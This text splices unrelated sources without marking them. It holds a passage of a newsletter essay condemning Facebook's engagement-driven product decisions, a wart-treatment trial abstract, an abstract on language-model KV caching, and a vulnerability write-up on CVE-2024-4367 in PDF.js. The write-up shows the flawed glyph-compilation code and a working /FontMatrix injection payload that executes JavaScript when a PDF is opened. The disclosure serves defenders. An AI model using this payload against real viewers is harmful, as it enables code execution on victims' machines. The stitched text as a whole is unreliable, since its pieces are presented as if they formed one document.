dangerous and scurrilous growth machine for the company.&nbsp;</p><p>In January 2012, Facebook’s true rot would set in, <a href="https://techcrunch.com/2011/12/20/sponsored-stories-news-feed/?ref=wheresyoured.at"><u>with the launch of sponsored stories in Facebook’s News Feed</u></a>, which Josh Constine, in a moment that should bring him deep shame, claimed he’d “rather see [Facebook]…inform [him] about the activity of friends than traditional ads that can be much less relevant,” a statement that frames exactly how little the tech media criticized this company. He also added one interesting tidbit — that Facebook had tested letting advertisers pay for sponsored content in the News Feed in 2006, but discontinued doing so in 2008, deciding that advertisers shouldn’t be able to show content in the News Feed unless it could appear there naturally, a statement that Constine wrote without a single hint of alarm.</p><p>In February, Lars Backstrom, the architect of People You May Know, would move over to manage News Feed ranking, and a few months later, Facebook would acquire Instagram for $1 billion dollars. In May, Facebook would have what would be considered a disastrous IPO, with Wall Street concerned about its lack of growth on mobile devices. After its first day of trading, the share price was barely above its debut, and by September, it had shed more than half its value.&nbsp;</p><p>Something had to change, and sometime in 2012, Facebook would promote product manager Adam Mosseri to the head of Facebook’s News Feed division. It was during this period when it started recommending content in the News Feed.&nbsp;</p><p><a href="https://www.theguardian.com/technology/2012/feb/01/facebook-letter-mark-zuckerberg-text?ref=wheresyoured.at"><u>In Mark Zuckerberg’s statement of intent to potential investors in Facebook’s IPO</u></a>, he declared that there was a “huge need and huge opportunity to get everyone in the world connected,” or what I like to know as Phase 1 of Facebook’s decline.&nbsp;</p><p>Behind the curtain, Zuckerberg’s vision wasn’t to “get everyone in the world connected,” but to get everyone in the world connected to Facebook, and by the end of 2012 the site had a billion users, or a seventh of humanity.&nbsp;&nbsp;</p><p>He also made one very bizarre statement: that Facebook didn’t build services to make money, but made money to build services.&nbsp;</p><p>Nothing could have been further from the truth.</p><hr><p>For over a decade, Facebook has deliberately made itself worse to make more money, thanks Mark Zuckerberg and the Growth Team perpetuating a culture that manipulates and tortures users to make company metrics improve.&nbsp;</p><p><a href="https://www.buzzfeednews.com/article/ryanmac/growth-at-any-cost-top-facebook-executive-defended-data?ref=wheresyoured.at#.upw3jdyR8"><u>In a 2016 memo leaked to Buzzfeed several years ago</u></a>, then-Vice President Andrew “Boz” Bosworth — now Facebook’s Chief Technology Officer — wrote a horrifying screed that romanticized Facebook’s growth-at-all-costs culture. Boz noted that connecting people on Facebook “may cost a life by exposing someone to bullies,” and that “maybe someone dies in a terrorist attack” coordinated using Facebook’s tools, and that because Facebook’s mission was to “connect people,” “all the work [Facebook does] in growth is justified.”&nbsp;</p><p>Boz makes it clear that this is a moral judgment by adding that “all questionable contact importing practices, all the subtle language that helps people stay searchable friends, all the work we do to bring more communication in” was justified in the pursuit of growth.&nbsp;</p><p>This man — this horrible, nasty man — is the Chief Technology Officer of Meta, and the mastermind behind both Meta’s Metaverse and Artificial Intelligence goals.</p><p>And as I’ll explain, Facebook is culturally a growth-at-all-costs company, and will make any changes it needs to make to its products to make a number go up.</p><p>In December 2020, a Facebook engineer published a document they wrote in 2019 called “When User-Engagement ≠ User-Value,” shared with me by a source that tells me they’re available through Harvard.</p><figure><img src="https://lh7-us.googleusercontent.com/3mh97DITsxmyUcpzUWmMKEoQhnrb7ZENUa49MGuF0awYXfJP_ifIWV2fjm9uIgmEjMc7RVdQ-29AN5D2mHdKmKS_lcmyKtbfkwfLwtrDQiiriZMJAToNHNPQhYKdttk8v3keVhaAV5zUpFALGK9cwuc" alt="" loading="lazy" width="760" height="596"><figcaption><b><strong>Caption: A section of “When User-Engagement ≠ User-Value,” written in 2019, published in December 2020.</strong></b></figcaption></figure><p>This remarkable document, shared with Facebook’s staff, makes a stark warning that Facebook’s brutal focus on user engagement and “time spent” damages the user experience, first explaining the historical context using the analogue of Cable TV versus Broadcast TV, and how Cable TV needs to maximize overall value for their fixed-free offerings, and Broadcast TV needs to maximize engagement with their channels, something the engineer explains some networks do by having constant recaps, padding scenes and adding cliffhangers.</p><p>The engineer then explains the several ways that Facebook makes its products worse to maximize engagement. He lists how:</p><ul><li>Facebook deliberately limited the amount of information in notifications to make people come to the site to increase engagement, as people had to keep checking the site to see what was happening and couldn’t rely on notifications for, well, notifying them about stuff. The engineer referred to this as a “clear value-engagement tradeoff.”</li><li>Facebook deliberately stopped sending out emails telling people what happened on their feed so that they’d have to check the site.</li><li>Facebook, by maximizing for time spent on the site, incentivizes “bad ranking,” I imagine because when you’re incentivizing to keep people on the site, you’re not actually trying to provide a service.</li><li>Headlines on the Facebook feed say misleading things and “subtly exaggerate” to get people to click links “all the time,” and the solution to deal with it was “very crude.”</li></ul><p>This piece is a dire warning to Facebook’s internal staff, and includes numerous worrying warnings about how the company keeps users engaged, layered with evidence from the news and academia.</p><p>The engineer warns:</p><ol><li>Higher Facebook use is correlated with worse psychological states.</li><li>An experiment found that a 1-month break from Facebook improved self-reported well-being.</li><li>A large fraction of Facebook users struggle with their Facebook/Instagram use.</li><li>A significant minority of Facebook users (3.1%) report serious problems with sleep, work or relationships that they attribute to Facebook AND concerns or preoccupations with how they use Facebook.”</li></ol><figure><img src="https://lh7-us.googleusercontent.com/zXIoDWwYPRVvHHEd-yqTYPFvfAVWKv_VprfWTvq-FL61CzFYylDXsCEwzxrENHkNWWXLs2YGHqkQyVCJix_AebsdAFy4gABNmF04_BGDTPeH40lEqkWMm94UFtp6m9hmSzV-sHvH3Tplb6_8oppTq_A" alt="" loading="lazy" width="716" height="428"><figcaption><b><strong>Caption: A section of “When User-Engagement ≠ User-Value,” written in 2019, published in December 2020.</strong></b></figcaption></figure><p>In their suggested solutions, the engineer notes that “over the last couple of years News Feed slowly switched from maximizing time-spent towards maximizing sessions” — meaning that Facebook had now changed to focus less on how long a user was on the platform and more toward maximizing how many times someone visited the platform, which the engineer noted was “a strong predictor of problematic use.”</p><p>This document — again, written in 2019 and published in 2020 — frames both how craven Facebook was about twisting its users’ habits, and how intimately aware it was of these problems. One commenter added, in a larger thought about addiction, that they “worried that driving sessions incentivized Facebook to make [its] products more addictive, without providing much more value.”</p><p>And that's exactly what Facebook has become: a gratuitous social experiment where the customer is manipulated to match metrics handed on from on high.&nbsp;</p><p>For over a decade, Facebook has knowingly and repeatedly taken steps to maximize activities on the website at the cost of the user experience, making countless tweaks to the product to increase internal metrics obsessed over by Mark Zuckerberg, Alex Schultz and Javier Olivan.&nbsp;</p><p>In another document provided to me by the same source, one engineer explained in October 2020 an internal channel why the Facebook App Took on sessions as a “Top-Line Metric” for 2019. The piece centered around Facebook’s app strategy of building “socially powered services” that were focused on the “possibilities of what people could do” with Facebook, largely because Facebook had no easy way to measure how it “satisfied user needs.”&nbsp;</p><p>This document is important, because it reveals some very specific details about the company — such as that in 2014, Mark Zuckerberg unilaterally decided that time spent on Facebook was a “top level company Engagement goal,” and forced it upon the News Feed team despite their protests that it was “too easy to game.”</p><p>To be clear, when someone at Facebook says something is “too easy to game,” it means that they are warning that people building products inside Facebook will try and game the system by making it worse to hit metrics — such as, in the case of Time Spent on the app, making the product more convoluted to use, meaning that people use the app more because it takes more effort to do a given thing.</p><blockquote>Hey, this reminds me of something. <a href="https://www.wheresyoured.at/the-men-who-killed-google/#:~:text=A%20day%20later,to%20come%20back.%E2%80%9D"><u>When Prabhakar Raghavan led a coup to take over Google Search from Ben Gomes, his specific obsession was with “queries,” or how many searches people made on Google</u></a>. Mark Zuckerberg effectively did the same thing, demanding in 2014 that Facebook increase two metrics — Daily Active People and Time Spent on Facebook — <em>perpetually increase 10% year-over-year</em>. It didn’t matter if these things made the product worse, or didn’t actually show their users were happy. All that mattered was if the number went up.</blockquote><figure><img src="https://lh7-us.googleusercontent.com/YKzoBBe5GQj1R5gJtBMF1SNxMYfwTrBA8pJjJUO6ZuJXkl-3CXw-Jm5lpfNGHNVwVMFhhxmIETLODp28EWGKx-rcYDNyuEQlSukK4laHLJVWggq6ov_XkaynEGLtQvNS2RL3ZsROSQ7A8-qzVVvQap4" alt="" loading="lazy" width="778" height="202"><figcaption><b><strong>Caption: A section of “Why FB App Took on Sessions as a Top-Line Metric for 2019,” posted October 2020, where “Zuck…declared the goal was a perpetual 10%T y/y growth in Family TS (Time Spent)/DAP (Daily Active People).”&nbsp;</strong></b></figcaption></figure><p>In 2017, the document notes that engagement metrics started to dive, but the company’s focus on “Time Spent” meant that nobody noticed because the number that Mark Zuckerberg cared about went up, until the alarm was sound and Facebook moved to “Sessions.”</p><figure><img src="https://lh7-us.googleusercontent.com/HJhTiuaNu7z5UUMlxE6h5bH220AZBYDS1wvN0B3EXwmd1l_bNxoMHzr-T6LkWUTx7RrYmzTFhArvAu_1IyLVOU-rrKYEK8mShejwA0NBTQVvjXw9sZDZlpafEKbyxQXgFXS9Y81aN9WznjfbLmBc75U" alt="" loading="lazy" width="613" height="157"><figcaption><b><strong>Caption: A section of “Why FB App Took on Sessions as a Top-Line Metric for 2019,” posted October 2020, discussing how Facebook “was no longer focused on your friends,” leading them to pivoting to “meaningful interactions.”&nbsp;</strong></b></figcaption></figure><p>In this document, they discuss the term “meaningful interactions,” the underlying metric which (allegedly) guides Facebook today. <a href="https://www.facebook.com/business/news/news-feed-fyi-bringing-people-closer-together"><u>In January 2018</u></a>, Adam Mosseri, then Head of News Feed, would post that an update to the News Feed would now “prioritize posts that spark conversations and meaningful interactions between people,” which may explain the chaos (and rot) in the News Feed thereafter.</p><p>To be clear, metrics around time spent hung around at the company, especially with regard to video, and Facebook has repeatedly and intentionally made changes to manipulate its users to satisfy them. In his book “<a href="https://www.googleadservices.com/pagead/aclk?sa=L&amp;ai=DChcSEwiFs7y30_yFAxV3NIcDHX1HC_sYABAGGgJqZg&amp;ase=2&amp;gclid=CjwKCAjwouexBhAuEiwAtW_Zx9F-yiJ_A_Y7p8BzVE_bnnJ7dDV5IFeYjXbY4xNq2s789d262XrtpxoC8_IQAvD_BwE&amp;ohost=www.google.com&amp;cid=CAESVuD2Gu4n3KsjSA9z6zNL3bdKhcsNS2Une4IrZvBduby8OnpLcdUvEhyyVP0GjjHONNYBETcmHb9CnqUB1bQP7C3INdwv2KQc0x9SzK6UBi_FDDPPtiIa&amp;sig=AOD64_0vi5bM7EoF7SkYMuhhiguibdGLsw&amp;ctype=5&amp;q=&amp;nis=6&amp;ved=2ahUKEwjy_rW30_yFAxW7LUQIHfh6CocQ9aACKAB6BAgFECE&amp;adurl=&amp;ref=wheresyoured.at"><u>Broken Code</u></a>,” Jeff Horwitz notes that Facebook “changed its News Feed design to encourage people to click on the reshare button or follow a page when they viewed a post,” with “engineers altering the Facebook algorithm to increase how often users saw content reshared from people they didn’t know.”&nbsp;</p><p>Horwitz also notes that Facebook began hunting for “friction…anything that was slowing users down or limiting their activity—with the goal of eliminating it,” something that manifested in Facebook allowing users to create an unlimited number of pages and cross-post the same material to multiple groups at once, and even a change to People You May Know that prioritized recommending accounts that were likely to accept a friend request.&nbsp;</p><p>Naturally, this led to negative incentives. In an internal document from 2018 called “The Friending 1%: Inequality in Friending,” an unnamed internal Facebook worker noted that Facebook’s aggressive optimization to make people send friend requests had created a situation where 0.5% percent of Facebook accounts were responsible for 50 percent of friend requests.&nbsp;</p><p>Worse still, accounts that were less than 15-days-old now made up 20 percent of all outgoing friend requests, and<em> more than half of friend</em> requests were sent by somebody who was making more than 50 of them a day, heavily suggesting that Facebook was growing its platform’s “connections” through spam.&nbsp;</p><figure><img src="https://lh7-us.googleusercontent.com/PCeiyQMPXGrLDYu-KytdBbnPu4_SUYmYsDLP1FKK0ePCAJUI0khrBk1NFhoCXM9aloSHV4S2Nh7T8241IjVKHvUZNCUW2CB8xWyLmanD9tRoTWa1ht-jY0qNRZFVCxZzV4dsUjrsUPg9J4eWxTRNpQQ" alt="" loading="lazy" width="845" height="561"><figcaption><b><strong>Caption: An excerpt of “The Friending 1%: Inequality in Friending, posted November 2018.</strong></b></figcaption></figure><p>In a later document published in mid-2019, another engineer proposes limiting the amount of invites that Facebook users can send to groups, specifically noting that “a larger proportion of invites into bad groups come from a small subset” of “whale inviters” that sent massive amounts of invites in a small amount of time, specifically noting this effect in vaccine misinformation groups, which posed an “integrity and product relevance risk” to the company.</p><p>A few years ago, I'm told that Zuckerberg begrudgingly established <em>some</em> limits on invites, but it’s unclear what those limits are.&nbsp;</p><hr><p>For Facebook — and Meta at large — anything that might limit growth is a non-starter. Sometime in 2020, another document that is apparently available through Harvard proposes limiting the distribution (as in the recommendation) of groups before they’re proven to be trustworthy. The problem, as the unnamed engineer describes, is “that “unproven” movements” were able to get traction on Facebook way before community standards could review them, some gaining over a million followers in a single day, and that the groups began to violate community standards way <em>after</em> they gained traction. As you’ve likely guessed, no such limitation was ever implemented on Facebook.&nbsp;</p><p>In Broken Code, Horwitz notes that “even when the safety benefits were high and the business risks were low…” Facebook would choose <em>not</em> to use its emergency “break the glass” playbooks to take action, and even when it did, it was quick to roll them back.&nbsp;</p><p>Horwitz gives an example of the runup to Myanmar’s 2020 election, where the company rolled out Break The Glass measures, “[limiting] the spread of reshared content and [replacing] it with more content from users’ friends.” The countermeasures “produced an impressive 25% reduction in viral inflammatory posts and a 49% reduction in viral hoax photos” at a meager two percent loss in “meaningful social interactions,” Facebook’s favorite metric. Horwitz notes that despite this small change in engagement, an internal team chose to roll these changes back a few months later.</p><p>One particularly gruesome story is that of Project Daisy, <a href="https://www.wsj.com/articles/facebook-knows-instagram-is-toxic-for-teen-girls-company-documents-show-11631620739?ref=wheresyoured.at"><u>a pilot program that would remove likes from Instagram to reduce the anxiety and negative feelings that teenagers felt using the app</u></a> that was retired after Adam Mosseri, now head of Instagram, claimed it had “very little impact and the result was neutral,” relegating it to an opt-in feature. <a href="https://oag.ca.gov/system/files/attachments/press-docs/Less-redacted%20complaint%20-%20released.pdf?ref=wheresyoured.at"><u>Yet a complaint</u></a> filed by several US states including California, New York, North Carolina and Pennsylvania in May 2023 quoted a meta researcher saying that Project Daisy was “one of the clearest things (supported by research that [Meta could] do to positively impact social comparison and well being on IG and we should ship it,” with another researcher saying that “Daisy is such a rare case where a product intervention can improve well-being for almost everyone that uses our products.” Chillingly, one Meta employee said that if Meta refused to implement Daisy despite the research, they were “doubtful” that Meta would implement “any broad product changes with the purpose of improving user well-being,” which I think we can all agree is accurate.&nbsp;</p><p>The suit is labyrinthine, and specifically makes one allegation that aligns with the current state of both Facebook and Instagram — that “Meta’s algorithm alters users’ experience on the Platform and draws unwitting users into rabbit holes of algorithmically curated material.”&nbsp;</p><p>And as I’ve mentioned before, the people involved from the very beginning are those perpetuating the same outright abuse of their users. An email thread from late 2017 and early 2018 cited on page 54 of the aforementioned complaint between Adam Mosseri and other executives discussed “significant declines in U.S. engagement metrics,” naming how reducing notifications was associated with reduced engagement, with an unnamed employee stating that there would be a tradeoff between making a better notification experience for users and recovering flailing numbers in Facebook’s “Daily Active People” metric.&nbsp;</p><p>In the same thread, Chief Product Officer Chris Cox said that if the team believed that a filtered notification experience was better, they shouldn’t make changes because a metric was down, adding that Meta needed to “get better at making the harder decisions” when the main decision criteria was experience rather than one particular metric. The then-VP of Analytics and now Chief Marketing Officer responded that he “fundamentally believed that [Meta] abused the notifications channel as a company.” Though the suit doesn’t quote the rest of the thread, it notes that Director of Growth Andrew Bocking ended the discussion by saying that Meta would “prioritize engagement over reducing notifications,” and that he “just got clear input from Naomi [Gleit] that US DAP [Daily Active People] is a bigger concern for [Mark Zuckerberg] right now than user experience.”&nbsp;</p><p><a href="https://www.wheresyoured.at/the-men-who-killed-google/" rel="noreferrer">When I wrote about Prabhakar Raghavan’s destruction of Google Search</a>, it was much harder to find real, tangible proof of his actions — though one could easily chart a path of intent in how he wanted to increase queries and revenue in Google Search at any cost. In Meta’s case, things are much easier.&nbsp;</p><p>Mark Zuckerberg is personally responsible for the state of Facebook and Instagram today, and has assembled a cadre of growth fiends that will — at times happily and other times begrudgingly — make the user experience worse to increase engagement. And this isn’t a new phenomenon. From the very early days of Facebook, Mark Zuckerberg has acted without remorse, tricking and scheming and screwing others over in pursuit of digital dominance and financial gain in a way that I find absolutely stomach churning.&nbsp;</p><p>Yet Zuckerberg could not perpetuate these disgusting acts without the help of people like Chief Marketing Officer Alex Schultz, who saw to it that Meta shut down CrowdTangle, <a href="https://www.wired.com/story/meta-kills-crucial-transparency-tool-worst-possible-time/?ref=wheresyoured.at"><u>a public insights tool from Meta that allowed researchers to easily analyze what was happening on Facebook</u></a>. Horwitz reports in Broken Code that Facebook — led by Alex Schultz — killed CrowdTangle because reporter Kevin Roose kept posting a list of Facebook’s most-engaged-with content, and that Facebook was dominated with right wing lunacy and misinformation like “Plandemic,” a COVID conspiracy film that Joel Kaplan, head of Meta’s public policy team, initially blocked the health team from removing until Roose reported that it was Facebook’s number one post.</p><p>Just to be <em>abundantly</em> clear, the Head of Public Policy at Facebook deliberately allowed the spread of COVID conspiracies, and would have continued to do so if a reporter hadn’t used a Facebook tool to show how popular they were, which resulted in Facebook choosing to <em>kill the tool that allowed the reporter to find out.</em></p><p>Every single terrible thing you see on Facebook — be it some sort of horrible right wing nonsense or a confusing and annoying product decision — is made in pursuit of growth. Every bit of damage that Meta has caused to the world has been either an act of ignorance or deliberate harm, at many times tweaking the product to make it harder or more annoying to use so that you will log onto Facebook or Instagram multiple times a day and spend as much time on there as possible.</p><p>This should explain why both Instagram and Facebook are so utterly abysmal to use. Meta’s company culture is one of sycophancy and user abuse, and both of these apps are deliberately engineered to get in the way of what you want to do as a means of increasing your engagement, even if said engagement is won because the thing you’re engaging with is actively fighting you.</p><p>And the rot begins at the top, with these horrifying choices perpetuated by Mark Zuckerberg, with his enforcer Naomi Gleit making demands of engineers desperate to appease the almighty Zuck, having to (to quote Horwitz) “be careful to not frame decisions in terms of right and wrong.”&nbsp;</p><p><em>This</em> is the petty king of the tech industry — a multi-billionaire that can never be fired, that has billions of people on websites that he has deliberately engineered to boost engagement rather than provide a service.&nbsp;</p><p>I won’t mince words. Mark Zuckerberg is a scumbag that hurts his users for profit. The entire tech industry should know who he is, the culture he has created, and the ways in which he has brutalized his company into finding ways to increase numbers at the cost of his users’ happiness.</p><p>As I’ll discuss in the next newsletter, this shameless and fundamentally anti-social approach is ultimately self-destructive, and Facebook’s dominant position is looking increasingly tenuous. Next week, I’ll show you how his disgusting attitude toward running a company is tearing Facebook and Instagram to the ground, and how Meta is trying to obfuscate its decline with Enron-style metric-cooking tactics.</p><hr><p>Thanks for reading Where's Your Ed At! </p><p>If you enjoyed this newsletter, please listen to my podcast <a href="http://www.betteroffline.com/?ref=wheresyoured.at" rel="noreferrer">Better Offline</a>, the <a href="http://www.reddit.com/r/betteroffline?ref=wheresyoured.at" rel="noreferrer">Better Offline Reddit</a>, or join me on the <a href="http://chat.wheresyoured.at/?ref=wheresyoured.at" rel="noreferrer">WYEA Discord chat</a>. </p>

    <p>
      
        <strong>
          Objective:
        </strong>
      
      To determine if application of duct tape is as effective as cryotherapy in the treatment of common warts.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Design:
        </strong>
      
      A prospective, randomized controlled trial with 2 treatment arms for warts in children.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Setting:
        </strong>
      
      The general pediatric and adolescent clinics at a military medical center.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Patients:
        </strong>
      
      A total of 61 patients (age range, 3-22 years) were enrolled in the study from October 31, 2000, to July 25, 2001; 51 patients completed the study and were available for analysis.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Intervention:
        </strong>
      
      Patients were randomized using computer-generated codes to receive either cryotherapy (liquid nitrogen applied to each wart for 10 seconds every 2-3 weeks) for a maximum of 6 treatments or duct tape occlusion (applied directly to the wart) for a maximum of 2 months. Patients had their warts measured at baseline and with return visits.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Main outcome measure:
        </strong>
      
      Complete resolution of the wart being studied.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Results:
        </strong>
      
      Of the 51 patients completing the study, 26 (51%) were treated with duct tape, and 25 (49%) were treated with cryotherapy. Twenty-two patients (85%) in the duct tape arm vs 15 patients (60%) enrolled in the cryotherapy arm had complete resolution of their warts (P =.05 by chi(2) analysis). The majority of warts that responded to either therapy did so within the first month of treatment.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Conclusion:
        </strong>
      
      Duct tape occlusion therapy was significantly more effective than cryotherapy for treatment of the common wart.
    </p>

            <span>Abstract:</span>Huge memory consumption has been a major bottleneck for deploying high-throughput large language models in real-world applications. In addition to the large number of parameters, the key-value (KV) cache for the attention mechanism in the transformer architecture consumes a significant amount of memory, especially when the number of layers is large for deep language models. In this paper, we propose a novel method that only computes and caches the KVs of a small number of layers, thus significantly saving memory consumption and improving inference throughput. Our experiments on large language models show that our method achieves up to 26$\times$ higher throughput than standard transformers and competitive performance in language modeling and downstream tasks. In addition, our method is orthogonal to existing transformer memory-saving techniques, so it is straightforward to integrate them with our model, achieving further improvement in inference efficiency.

    <h3>
        TL;DR    </h3>
<div>
    <p>This post details <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2024-21/#CVE-2024-4367" target="_blank" rel="noopener">CVE-2024-4367</a>, a vulnerability in PDF.js found by Codean Labs. PDF.js is a JavaScript-based PDF viewer maintained by Mozilla. This bug allows an attacker to execute arbitrary JavaScript code as soon as a malicious PDF file is opened. This affects <strong>all Firefox users</strong> (&lt;126) because PDF.js is used by Firefox to show PDF files, but also seriously impacts <strong>many web- and Electron-based applications</strong> that (indirectly) use PDF.js for preview functionality.</p>
<p><em>If you are a developer of a JavaScript/Typescript-based application that handles PDF files in any way, we recommend checking that you are not (indirectly) using a version a vulnerable version of PDF.js. See the end of this post for mitigation details.</em></p>
</div>

    <h2>
        Introduction    </h2>
<div>
    <p>There are two common use-cases for PDF.js. First, it is Firefox’s built-in PDF viewer. If you use Firefox and you’ve ever downloaded or browsed to a PDF file you’ll have seen it in action. Second, it is bundled into a Node module called <code>pdfjs-dist</code>, with ~2.7 million weekly downloads according to NPM. In this form, websites can use it to provide embedded PDF preview functionality. This is used by everything from Git-hosting platforms to note-taking applications. The one you’re thinking of now is likely using PDF.js.</p>
<p>The PDF format is famously complex. With support for various media types, complicated font rendering and even rudimentary scripting, PDF readers are a common target for vulnerability researchers. With such a large amount of parsing logic, there are bound to be some mistakes, and PDF.js is no exception to this. What makes it unique however is that it is written in JavaScript as opposed to C or C++. This means that there is no opportunity for memory corruption problems, but as we will see it comes with its own set of risks.</p>
</div>

    <h2>
        Glyph rendering    </h2>
<div>
    <p>You might be surprised to hear that this bug is not related to the PDF format’s (JavaScript!) scripting functionality. Instead, it is an oversight in a specific part of the font rendering code.</p>
<p>Fonts in PDFs can come in several different formats, some of them more obscure than others (at least for us). For modern formats like TrueType, PDF.js defers mostly to the browser’s own font renderer. In other cases, it has to manually turn <em>glyph</em> (i.e., character) descriptions into curves on the page. To optimize this for performance, a <em>path generator</em> function is pre-compiled for every glyph. If supported, this is done by making a JavaScript <code>Function</code> object with a body (<code>jsBuf</code>) containing the instructions that make up the path:</p>
<pre><code>
// If we can, compile cmds into JS for MAXIMUM SPEED...
if (this.isEvalSupported &amp;&amp; FeatureTest.isEvalSupported) {
  const jsBuf = [];
  for (const current of cmds) {
    const args = current.args !== undefined ? current.args.join(",") : "";
    jsBuf.push("c.", current.cmd, "(", args, ");\n");
  }
  // eslint-disable-next-line no-new-func
  console.log(jsBuf.join(""));
  return (this.compiledGlyphs[character] = new Function(
    "c",
    "size",
    jsBuf.join("")
  ));
}
</code></pre>
<p>From an attacker perspective this is really interesting: if we can somehow control these <code>cmds</code> going into the <code>Function</code> body and insert our own code, it would be executed as soon as such a glyph is rendered.</p>
<p>Well, let’s look at how this list of commands is generated. Following the logic back to the <code>CompiledFont</code> class we find the method <code>compileGlyph(...)</code>. This method initializes the <code>cmds</code> array with a few general commands (<code>save</code>, <code>transform</code>, <code>scale</code> and <code>restore</code>), and defers to a <code>compileGlyphImpl(...)</code> method to fill in the actual rendering commands:</p>
<pre><code>
  compileGlyph(code, glyphId) {
    if (!code || code.length === 0 || code[0] === 14) {
      return NOOP;
    }

    let fontMatrix = this.fontMatrix;
    ...

    const cmds = [
      { cmd: "save" },
      { cmd: "transform", args: fontMatrix.slice() },
      { cmd: "scale", args: ["size", "-size"] },
    ];
    this.compileGlyphImpl(code, cmds, glyphId);

    cmds.push({ cmd: "restore" });

    return cmds;
  }
</code></pre>
<p>If we instrument the PDF.js code to log generated <code>Function</code> objects, we see that the generated code indeed contains those commands:</p>
<pre><code>
c.save();
c.transform(0.001,0,0,0.001,0,0);
c.scale(size,-size);
c.moveTo(0,0);
c.restore();
</code></pre>
<p>At this point we could audit the font parsing code and the various commands and arguments that can be produced by glyphs, like <code>quadraticCurveTo</code> and <code>bezierCurveTo</code>, but all of this seems pretty innocent with no ability to control anything other than numbers. What turns out to be much more interesting however is the <code>transform</code> command we saw above:</p>
<pre><code>
{ cmd: "transform", args: fontMatrix.slice() },
</code></pre>
<p>This <code>fontMatrix</code> array is copied (with <code>.slice()</code>) and inserted into the body of the <code>Function</code> object, joined by commas. The code clearly assumes that it is a numeric array, but is that always the case? Any string inside this array would be inserted literally, without any quotes surrounding it. Hence, that would break the JavaScript syntax at best, and give arbitrary code execution at worst. But can we even control the contents of <code>fontMatrix</code> to that degree?</p>
</div>

    <h2>
        Enter the FontMatrix    </h2>
<div>
    <p>The value of <code>fontMatrix</code> defaults to <code>[0.001, 0, 0, 0.001, 0, 0]</code>, but is often set to a custom matrix by a font itself, i.e., in its own embedded metadata. How this is done exactly differs per font format. Here’s the <a href="https://en.wikipedia.org/wiki/PostScript_fonts" target="_blank" rel="noopener">Type1</a> parser for example:</p>
<pre><code>
  extractFontHeader(properties) {
    let token;
    while ((token = this.getToken()) !== null) {
      if (token !== "/") {
        continue;
      }
      token = this.getToken();
      switch (token) {
        case "FontMatrix":
          const matrix = this.readNumberArray();
          properties.fontMatrix = matrix;
          break;
        ...
      }
      ...
    }
    ...
  }
</code></pre>
<p>This is not very interesting for us. Even though Type1 fonts technically contain arbitrary Postscript code in their header, no sane PDF reader supports this fully and most just try to read predefined key-value pairs with expected types. In this case, PDF.js just reads a number array when it encounters a <code>FontMatrix</code> key. It appears that the <code>CFF</code> parser — used for several other font formats — is similar in this regard. All in all, it looks like we are indeed limited to numbers.</p>
<p>However, it turns out that there is more than one potential origin of this matrix. Apparently, it is also possible to specify a custom <code>FontMatrix</code> value outside of a font, namely in a metadata object in the PDF! Looking carefully at the <code>PartialEvaluator.translateFont(...)</code> method, we see that it loads various attributes from PDF dictionaries associated with the font, one of them being the <code>fontMatrix</code>:</p>
<pre><code>
    const properties = {
      type,
      name: fontName.name,
      subtype,
      file: fontFile,
      ...
      fontMatrix: dict.getArray("FontMatrix") || FONT_IDENTITY_MATRIX,
      ...
      bbox: descriptor.getArray("FontBBox") || dict.getArray("FontBBox"),
      ascent: descriptor.get("Ascent"),
      descent: descriptor.get("Descent"),
      xHeight: descriptor.get("XHeight") || 0,
      capHeight: descriptor.get("CapHeight") || 0,
      flags: descriptor.get("Flags"),
      italicAngle: descriptor.get("ItalicAngle") || 0,
      ...
    };
</code></pre>
<p>In the PDF format, font definitions consists of several objects. The <code>Font</code>, its <code>FontDescriptor</code> and the actual <code>FontFile</code>. For example, here represented by objects 1, 2 and 3:</p>
<pre><code>
1 0 obj
&lt;&lt;
  /Type /Font
  /Subtype /Type1
  /FontDescriptor 2 0 R
  /BaseFont /FooBarFont
&gt;&gt;
endobj

2 0 obj
&lt;&lt;
  /Type /FontDescriptor
  /FontName /FooBarFont
  /FontFile 3 0 R
  /ItalicAngle 0
  /Flags 4
&gt;&gt;
endobj

3 0 obj
&lt;&lt;
  /Length 100
&gt;&gt;
... (actual binary font data) ...
endobj
</code></pre>
<p>The <code>dict</code> referenced by the code above refers to the <code>Font</code> object. Hence, we should be able to define a custom <code>FontMatrix</code> array like this:</p>
<pre><code>
1 0 obj
&lt;&lt;
  /Type /Font
  /Subtype /Type1
  /FontDescriptor 2 0 R
  /BaseFont /FooBarFont
  /FontMatrix [1 2 3 4 5 6]   % &lt;-----
&gt;&gt;
endobj
</code></pre>
<p>When attempting to do this it initially looks like this doesn’t work, as the <code>transform</code> operations in generated <code>Function</code> bodies still use the default matrix. However, this happens because the font file itself is overwriting the value. Luckily, when using a Type1 font without an internal <code>FontMatrix</code> definition, the PDF-specified value <em>is</em> authoritative as the <code>fontMatrix</code> value is not overwritten.</p>
<p>Now that we can control this array from a PDF object we have all the flexibility we want, as PDF supports more than just number-type primitives. Let’s try inserting a string-type value instead of a number (in PDF, strings are delimited by parentheses):</p>
<pre><code>
/FontMatrix [1 2 3 4 5 (foobar)]
</code></pre>
<p>And indeed, it is plainly inserted into the <code>Function</code> body!</p>
<pre><code>
c.save();
c.transform(1,2,3,4,5,foobar);
c.scale(size,-size);
c.moveTo(0,0);
c.restore();
</code></pre>
</div>

    <h2>
        Exploitation and impact    </h2>
<div>
    <p>Inserting arbitrary JavaScript code is now only a matter of juggling the syntax properly. Here’s a classical example triggering an alert, by first closing the <code>c.transform(...)</code> function, and making use of the trailing parenthesis:</p>
<pre><code>
/FontMatrix [1 2 3 4 5 (0\); alert\('foobar')]
</code></pre>
<p>The result is exactly as expected:</p>
<div><p><a href="https://codeanlabs.com/wp-content/uploads/2024/05/pdfjs_alert_foobar.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" src="https://codeanlabs.com/wp-content/uploads/2024/05/pdfjs_alert_foobar.png" alt="Exploitation of CVE-2024-4367" width="1127" height="683"></a></p><p>Exploitation of CVE-2024-4367</p></div>
